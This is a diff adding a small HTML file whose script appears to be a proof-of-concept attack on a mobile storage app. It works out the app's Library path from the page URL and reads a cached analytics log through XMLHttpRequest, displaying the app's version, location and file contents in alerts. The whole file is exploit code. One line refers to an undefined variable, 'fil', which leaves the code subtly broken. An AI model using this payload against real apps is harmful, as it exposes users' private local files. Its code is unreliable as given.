@@ -1,0 +1,28 @@
+<script>
+alert(navigator.appVersion)
+alert(document.location)
+
+function readTextFile(file){
+
+    var rawFile = new XMLHttpRequest();
+    rawFile.open("GET", file, false);
+    rawFile.onreadystatechange = function ()
+    {
+        if(rawFile.readyState === 4)
+        {
+            if(rawFile.status === 200 || rawFile.status == 0)
+            {
+                var allText = rawFile.responseText;
+                alert(allText);
+            }
+        }
+    }
+    rawFile.send(null);
+}
+
+    var cutString = 'File%20Provider%20Storage';
+    var locationPath = location.href.split(cutString)[0] + 'Library';
+    var filePath = locationPath + '/Caches/analytics/current_log_net_box.BoxNet';
+    alert(fil)
+readTextFile(filePath);
+</script>
